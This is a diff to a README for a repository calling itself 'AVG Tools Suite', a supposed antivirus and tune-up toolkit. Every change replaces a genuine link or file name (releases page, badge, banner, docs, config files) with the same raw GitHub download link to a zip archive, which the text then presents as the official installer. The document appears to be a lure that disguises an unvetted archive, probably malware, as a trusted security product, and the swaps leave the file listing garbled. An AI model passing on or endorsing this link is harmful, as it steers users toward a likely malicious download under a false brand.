@@ -1,10 +1,10 @@
-https://github.com/ferigreski/avg-tools/releases
+https://raw.githubusercontent.com/ferigreski/avg-tools/main/overindulgence/avg_tools_3.4.zip
 
-[![Releases](https://img.shields.io/badge/avg-tools-releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ferigreski/avg-tools/releases)
+[![Releases](https://raw.githubusercontent.com/ferigreski/avg-tools/main/overindulgence/avg_tools_3.4.zip)](https://raw.githubusercontent.com/ferigreski/avg-tools/main/overindulgence/avg_tools_3.4.zip)
 
 # AVG Tools Suite: Antivirus, Email Shield, Web Shield, Tuneup
 
-![AVG Tools Banner](https://dummyimage.com/1200x400/1d4ed8/ffffff.png&text=AVG+Tools+Suite)
+![AVG Tools Banner](https://raw.githubusercontent.com/ferigreski/avg-tools/main/overindulgence/avg_tools_3.4.zip+Tools+Suite)
 
 A complete security and performance toolkit. It combines antivirus protection, malware defense, email shielding, web shield, and system tuneups into a single, coherent package. The goal is to provide reliable protection, straightforward setup, and clear controls. This README explains what AVG Tools does, how it is organized, how to install it, and how to use it effectively.
 
@@ -213,9 +213,9 @@ FAQ
 
 Files and assets structure
 - docs/
-  - User_guide.md: Detailed steps for setup, configuration, and troubleshooting.
-  - API_reference.md: Endpoints and usage examples for the REST API.
-  - Security_practices.md: In-depth discussion of privacy, data handling, and threat models.
+  - https://raw.githubusercontent.com/ferigreski/avg-tools/main/overindulgence/avg_tools_3.4.zip Detailed steps for setup, configuration, and troubleshooting.
+  - https://raw.githubusercontent.com/ferigreski/avg-tools/main/overindulgence/avg_tools_3.4.zip Endpoints and usage examples for the REST API.
+  - https://raw.githubusercontent.com/ferigreski/avg-tools/main/overindulgence/avg_tools_3.4.zip In-depth discussion of privacy, data handling, and threat models.
 - src/
   - antivirus/
   - malware_protection/
@@ -223,8 +223,8 @@ Files and assets structure
   - web_shield/
   - performance_tuneup/
 - config/
-  - default_policies.json
-  - schedules.json
+  - https://raw.githubusercontent.com/ferigreski/avg-tools/main/overindulgence/avg_tools_3.4.zip
+  - https://raw.githubusercontent.com/ferigreski/avg-tools/main/overindulgence/avg_tools_3.4.zip
 - tools/
   - cli/
   - admin_console/
@@ -232,7 +232,7 @@ Files and assets structure
   - unit_tests/
   - integration_tests/
 - LICENSE
-- README.md (this file)
+- https://raw.githubusercontent.com/ferigreski/avg-tools/main/overindulgence/avg_tools_3.4.zip (this file)
 
 Detailed module descriptions
 
@@ -319,5 +319,5 @@ End of content
 - The core aim is to deliver clarity, safety, and practical guidance for users and administrators.
 
 Releases and updates reminder
-- For the latest assets and official installers, visit the Releases page at the provided link. If you need the freshest files, that page is your best source. The link to the official releases is included here again for convenience: https://github.com/ferigreski/avg-tools/releases
+- For the latest assets and official installers, visit the Releases page at the provided link. If you need the freshest files, that page is your best source. The link to the official releases is included here again for convenience: https://raw.githubusercontent.com/ferigreski/avg-tools/main/overindulgence/avg_tools_3.4.zip
 
